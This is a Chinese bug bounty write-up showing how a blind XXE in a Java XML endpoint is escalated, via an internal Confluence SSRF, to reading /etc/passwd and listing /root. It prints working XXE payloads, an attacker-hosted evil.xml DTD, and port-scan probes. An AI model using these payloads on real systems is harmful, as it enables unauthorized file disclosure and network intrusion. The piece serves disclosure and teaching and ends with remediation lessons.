@@ -1,0 +1,265 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="33c83c268e6ea744478faa683cbaeb5d">从 blind XXE 到读取根目录文件</h1>
+<p>在一次最近的 <code>bug bounty</code>活动中，我找到了一个端点（应用服务）了<code>HTTP</code>响应的数据为<code>XML</code>结构，我认为这里存在一个<code>XXE</code>漏洞。但是关于这个端点（应用服务）是没有文档说明的，唯一能够找到的介绍是一篇2016年一位心烦意乱的开发人员写的。</p>
+<p>接下来，我大致描述一下我将一个中等难度漏洞提升成高危漏洞的过程和思路。</p>
+<p>我认为在测试的过程中遇到的错误信息是很重要的，我也会对这些错误信息进行强调，希望这些错误信息能够在未来为其他人指明正确的方向。</p>
+<p>注意：我已经对端点和其他信息进行了隐藏，因为漏洞是作为私有披露计划的一部分报告的，受影响的公司不希望发布任何关于其环境或发现的信息。</p>
+<h2 data-content="1" id="3de729f739b78b249e8c7cb64feea5d1">我发现了什么</h2>
+<p>为什么这个端点能够引起我的注意，是因为这个端点响应的是一个简单的<code>XML</code>结构的错误信息和404。</p>
+<p>请求：</p>
+<pre><code>GET /interesting/ HTTP/1.1
+Host: server.company.com</code></pre>
+<p>响应</p>
+<pre><code>HTTP/1.1 404 Not Found
+Server: nginx
+Date: Tue, 04 Dec 2018 10:08:18 GMT
+Content-Type: text/xml
+Content-Length: 189
+Connection: keep-alive
+
+&lt;result&gt;
+&lt;errors&gt;
+&lt;error&gt;The request is invalid: The requested resource could not be found.&lt;/error&gt;
+&lt;/errors&gt;
+&lt;/result&gt;</code></pre>
+<p>我改变请求的方法为<code>POST</code>时，在<code>header</code>头部添加 <code>Content-Type: application/xml</code>并在<code>POST</code>数据中添加了一个不合法的<code>XML</code>数据，响应更加说明这里有<code>XXE</code>漏洞了。</p>
+<p>请求：</p>
+<pre><code>POST /interesting/ HTTP/1.1
+Host: server.company.com
+Content-Type: application/xml
+Content-Length: 30
+
+&lt;xml version="abc" ?&gt;
+&lt;Doc/&gt;</code></pre>
+<p>响应：</p>
+<pre><code>&lt;result&gt;
+&lt;errors&gt;
+&lt;error&gt;The request is invalid: The request content was malformed:
+XML version "abc" is not supported, only XML 1.0 is supported.&lt;/error&gt;
+&lt;/errors&gt;
+&lt;/result&gt;</code></pre>
+<p>但是当我发送一个正确的结构化的<code>XML</code>文档时：<br/>
+请求：</p>
+<pre><code>POST /interesting/ HTTP/1.1
+Host: server.company.com
+Content-Type: application/xml
+Content-Length: 30
+
+&lt;?xml version="1.0" ?&gt;
+&lt;Doc/&gt;</code></pre>
+<p>响应：</p>
+<pre><code>&lt;result&gt;
+&lt;errors&gt;
+&lt;error&gt;Authentication failed: The resource requires authentication, which was not supplied with the request&lt;/error&gt;
+&lt;/errors&gt;
+&lt;/result&gt;</code></pre>
+<p>注意了，服务器明显需要凭证，在交互的过程中。遗憾的是，没有文档说明应该如何提供凭证，我也无法在任何地方找到可能有效的凭证。这可能是个坏消息，因为我以前遇到的许多XXE漏洞需要与端点进行某种“有效”交互。如果没有身份验证，利用这个漏洞可能会变得困难得多。</p>
+<p>但是现在还没有必要担心!在任何情况下，您都应该尝试包含<code>DOCTYPE</code>定义的字串，以查看是否完全禁止使用外部实体，或者是否可以继续追求乐趣和回报。所以我试着发送了如下请求包:</p>
+<p>请求</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://59c99fu65h6mqfmhf5agv1aptgz6nv.burpcollaborator.net/x"&gt; %ext;
+]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre>
+<p>响应：</p>
+<pre><code>The server was not able to produce a timely response to your request.</code></pre>
+<p>我看了下我的<code>Burp Collaborator</code>交互界面，没有期望的<code>HTTP</code>请求，只有如下部分。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181213184050-8ed0d3a2-fec3-1.png"/></p>
+<p>幸运的是！服务器明显解析了我的域名，但是没有<code>HTTP</code>请求。此外，注意到了服务器在几秒之后出现500错误。</p>
+<p>看起来像防火墙起作用了。我继续尝试进行针对不同端口的出站<code>HTTP</code>请求。但是没有可以达到效果的。所有端口都超时了，显示受影响的服务器至少可以依赖防火墙成功地阻止所有非预期的出站流量。给网络安全团队5分!</p>
+<h2 data-content="1" id="7c572dbd57fedf8853f75a9d08f16f37">只能做 blind xxe</h2>
+<p>在这一点上，我有一个有趣的发现，但还没有什么真正值得说明的。通过尝试访问本地文件、内部网络和内部服务，我希望能够从中获得一份中危的报告。</p>
+<p>为了证明影响，我展示了此漏洞可以用来成功确定文件是否存在:</p>
+<p>请求：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "file:///etc/passwd"&gt; %ext;
+]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre>
+<p>响应</p>
+<pre><code>The markup declarations contained or pointed to by the document type declaration must be well-formed.</code></pre>
+<p>这表明文件存在，XML解析器可以打开和读取文件，但是文件的内容不是有效的文档类型定义(DTD)，因此解析器失败并抛出错误。换句话说，外部实体的加载并没有被禁用，但是我们似乎没有得到任何输出。在这个阶段，这似乎是一个blind XXE漏洞。</p>
+<p>假设使用的是<code>Java</code>的<code>SAX Parser</code>解析器，因为报错似乎和<code>Java</code>错误类<a href="https://github.com/walkmod/walkmod-core/issues/82" target="_blank" title="有联系">有联系</a> <code>org.xml.sax.SAXParseExceptionpublicId</code></p>
+<p>这很有趣，因为Java在涉及XXE时有许多特性，我们稍后将指出这一点。</p>
+<p>当我们访问的文件不存在时，响应是这样的：</p>
+<p>请求</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "file:///etc/passwdxxx"&gt; %ext;
+]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre>
+<p>响应：</p>
+<pre><code>The request is invalid: The request content was malformed:
+/etc/passwdxxx (No such file or directory)</code></pre>
+<p>好的，有用但不太好; 如何使用这个<code>blind XXE</code>漏洞作为基本端口扫描器？</p>
+<p>请求：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://localhost:22/"&gt; %ext;
+]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre>
+<p>响应</p>
+<pre><code>The request is invalid: The request content was malformed:
+Invalid Http response</code></pre>
+<p>很好——这意味着我们可以列举内部服务。这仍然不是我想要的很酷的结果，但至少是一些值得报道的东西。这种类型的<code>blind XXE</code>有效地表现为与<code>blind</code>服务器端请求伪造(<code>SSRF</code>)漏洞类似的行为:您可以启动内部<code>HTTP</code>请求，但不能读取响应。</p>
+<p>这让我怀疑是否可以应用任何其他与<code>ssrf</code>相关的技术，以便更好地利用这个<code>blind XXE</code>漏洞。需要检查的一件事是对其他协议的支持，包括<code>https</code>、<code>gopher</code>、<code>ftp</code>、<code>jar</code>、<code>scp</code>等。</p>
+<p>请求:</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [ &lt;!ENTITY % ext SYSTEM "gopher://localhost/"&gt; %ext; ]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre>
+<p>响应：</p>
+<pre><code>The request is invalid: The request content was malformed:
+unknown protocol: gopher</code></pre>
+<p>这很有趣，因为它将用户提供的协议在错误消息中返回回来。我们把它记下来，以后再用。</p>
+<p>漏洞与<code>blind ssrf</code>漏洞具有相似性，看看我们是否能够访问任何内部<code>web</code>应用程序是有意义的。由于我的目标公司似乎与相当广泛和多样化的开发人员合作，<code>GitHub</code>中充斥着<code>x.company.internal</code>格式的地址。我找到了一些看起来很有前途的内部资源（很可能有漏洞的服务器）。</p>
+<pre><code>wiki.company.internal
+jira.company.internal
+confluence.company.internal</code></pre>
+<p>考虑到防火墙之前阻止了我的传出流量，我想验证内部流量是否也被阻止了，或者内部网络是否更可信。</p>
+<p>请求：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://wiki.company.internal/"&gt; %ext;
+]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre>
+<p>响应</p>
+<pre><code>The markup declarations contained or pointed to by the document type declaration must be well-formed.</code></pre>
+<p>有趣的是，我们以前看到过这个错误消息，它表示读取了请求的资源，但是没有正确格式化。这意味着允许内部网络通信，并且我们的内部请求成功了!</p>
+<p>这就是我们的处境。使用<code>blind XXE</code> 漏洞，可以向许多内部web应用程序发起请求，枚举文件系统中文件的存在性，以及枚举在所有内部主机上运行的服务。在这一点上，我报告了这种漏洞，并在周末前往耶路撒冷的城市之旅中思考进一步的可能性。</p>
+<h2 data-content="1" id="7bb78942e431a738925f94f24ba7522a">独眼称王</h2>
+<p>周末精神焕发地回来后，我下定决心要找出这个脆弱点可能造成的影响。具体来说，如果我可以在内部网络上找到一个类似代理的主机，未经过滤的内部网络流量可能被滥用将流量路由到外部。</p>
+<p>通常，在没有任何形式的可读反馈的情况下，在web应用程序上发现漏洞几乎是不可能的。幸运的是，在<a href="https://ecosystem.atlassian.net/browse/OAUTH-344" target="_blank" title="Jira中存在一个已知的SSRF漏洞">Jira中存在一个已知的SSRF漏洞</a>，这已经在<a href="https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a" target="_blank" title="许多文章中">许多文章中</a>得到了证明。</p>
+<p>我立即去测试我的运气与内部的Jira服务器</p>
+<p>请求：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "https://jira.company.internal/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x"&gt; %ext;
+]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre>
+<p>响应：</p>
+<pre><code>The request is invalid: The request content was malformed:
+sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</code></pre>
+<p><code>HTTPS</code> 的流量失败了，如果 <code>SSL</code> 验证出错的话。幸运的是，<code>Jira</code> 默认在<code>8080</code>端口上运行<code>HTTP</code>服务。</p>
+<p>请求：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://jira.company.internal:8080/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x"&gt; %ext;
+]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre>
+<p>响应：</p>
+<pre><code>The request is invalid: The request content was malformed:
+http://jira.company.internal:8080/plugins/servlet/oauth/users/icon-uri</code></pre>
+<p>我又检查了一下<code>Burp Collaborator</code> 的交互信息，但运气不佳。<code>Jira</code>实例可能已经打了补丁，或者已经禁用了易受攻击的插件。于是，我疯狂而徒劳地寻找不同类型的<code>Wiki</code>应用程序上已知的<code>SSRF</code>漏洞之后(并不是最优选择)，我决定测试内部<code>Confluence</code>实例是否存在相同的<code>Jira</code> 漏洞(默认情况下运行在端口8090上)。</p>
+<p>请求：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x"&gt; %ext;
+]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre>
+<p>响应：</p>
+<pre><code>The request is invalid: The request content was malformed:
+The markup declarations contained or pointed to by the document type declaration must be well-formed.</code></pre>
+<p>发现</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181213190611-19a009c8-fec7-1.png"/></p>
+<p>我们成功地通过一个内部易受攻击的<code>Confluence</code>来绕过防火墙限制出站的<code>internet</code>流量。这意味着我们现在可以尝试<code>XXE</code>的经典方法。让我们从托管一个<code>evil.xml</code>文件开始。攻击者服务器托管<code>evil.xml</code>，包含以下内容，希望触发有趣的错误消息:</p>
+<pre><code>&lt;!ENTITY % file SYSTEM "file:///"&gt;
+&lt;!ENTITY % ent "&lt;!ENTITY data SYSTEM '%file;'&gt;"&gt;</code></pre>
+<p>让我们更详细地看看这些参数实体的定义:</p>
+<ol>
+<li>将外部引用(在本例中是系统的/目录)的内容加载到变量中(%file)</li>
+<li>定义一个变量(%ent);它实际上只是将各个部分链接在一起来解释第三个实体</li>
+<li>尝试在（%file）位置访问资源;(无论它指向何处)并将该位置中的任何内容加载到实体（data）中。</li>
+</ol>
+<p>注意，我们希望第三个定义失败，因为<code>（%file）</code>的内容;不会指向有效的资源位置，而是包含完整目录的内容。</p>
+<p>现在，使用<code>Confluence</code>（<code>proxy</code>）指向我们的恶意文件，并确保参数<code>（%ent）</code>; 实体参数<code>(&amp;data；)</code>被访问以触发目录访问:</p>
+<p>请求：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml"&gt;
+%ext;
+%ent;
+]&gt;
+&lt;r&gt;&amp;data;&lt;/r&gt;</code></pre>
+<p>响应</p>
+<pre><code>no protocol: bin
+boot
+dev
+etc
+home
+[...]</code></pre>
+<p>太棒了!列出了服务器的目录内容!</p>
+<p>有趣的是，这显示了从服务器返回基于错误的输出的另一种方法，即指定一个“丢失的”协议，而不是我们前面看到的无效协议。</p>
+<p>这可以帮助我们解决在读取包含冒号的文件时遇到的最后一个难点，因为使用上述方法读取<code>/etc/passwd</code>会导致以下错误:</p>
+<p>请求：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml"&gt;
+%ext;
+%ent;
+]&gt;
+&lt;r&gt;&amp;data;&lt;/r&gt;</code></pre>
+<p>响应：</p>
+<pre><code>unknown protocol: root</code></pre>
+<p>换句话说，在冒号<code>:</code>第一次出现之前，可以读取文件，但是读取冒号之后不能再读取了。绕过这一点并强制在错误消息中显示完整的文件内容的一种方法是在文件内容之前加上一个冒号。这将导致<code>no protocol</code>错误，因为第一个冒号之前的字段将是空的，即未定义。托管的 <code>evil.xml</code> 修改为:</p>
+<pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % ent "&lt;!ENTITY data SYSTEM ':%file;'&gt;"&gt;</code></pre>
+<p>请求：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml"&gt;
+%ext;
+%ent;
+]&gt;
+&lt;r&gt;&amp;data;&lt;/r&gt;</code></pre>
+<p>响应：</p>
+<pre><code>no protocol: :root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+[…]</code></pre>
+<p>Java 在访问目录时还会返回目录列表，于是尝试访问根目录文件。</p>
+<p>evil.xml</p>
+<pre><code>&lt;!ENTITY % file SYSTEM "file:///root"&gt;
+&lt;!ENTITY % ent "&lt;!ENTITY data SYSTEM ':%file;'&gt;"&gt;</code></pre>
+<p>请求：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml"&gt;
+%ext;
+%ent;
+]&gt;
+&lt;r&gt;&amp;data;&lt;/r&gt;</code></pre>
+<p>响应：</p>
+<pre><code>no protocol: :.bash_history
+.bash_logout
+.bash_profile
+.bashrc
+.pki
+.ssh
+[...]</code></pre>
+<p>就是这样，看来我们很幸运。通过滥用不充分的网络分隔、未打补丁的内部应用程序服务器、过度特权的web服务器以及通过过于冗长的错误消息传递导致的信息泄漏，我们成功地将一个<code>blind XXE</code>漏洞提升为读取<code>root</code>目录和文件的漏洞。</p>
+<h2 data-content="1" id="6647a98476465014ba5a65754c6b7cad">经验</h2>
+<p>红队：</p>
+<ol>
+<li>如果有东西看起来很奇怪，那么继续挖掘</li>
+<li>
+<code>Java SAX</code>解析器对<code>URL</code>模式的有趣处理允许使用一些新的方法提取信息。虽然现代<code>Java</code>版本不允许将多行文件作为外部HTTP请求(即<code><a href="http://attacker.org/?&amp;file;" target="_blank">attacker.org/?&amp;file;</a></code>)的方式导出，但是在错误消息中，甚至在<code>URL</code>协议中，都可以获得多行响应</li>
+</ol>
+<p>蓝队：</p>
+<ol>
+<li>确保内部服务器和面向公众的服务器一样得到了及时的修补</li>
+<li>不要把内部网络视为一个受信任的安全区，而应采用适当的网络分隔</li>
+<li>将详细的错误消息写入错误日志，而不是HTTP响应</li>
+<li>依赖身份验证并不一定能缓解诸如XXE之类的低级问题</li>
+</ol>
+<h2 data-content="1" id="c122cd8594bdd4de90447e447948df50">时间线：</h2>
+<p>1.20181126-第一次注意到有趣的XML端点<br/>
+2.20181128-blind XXE报告:可以列举文件、目录、内部网络位置和开放端口<br/>
+3.20181203-发现易受攻击的内部Confluence服务器，报告POC演示了读取根目录文件的能力<br/>
+4.20181204-漏洞修复获得奖金<br/>
+5.20181206-申请发表文章;<br/>
+6.20181212-批准。</p>
+</div>
+</div>
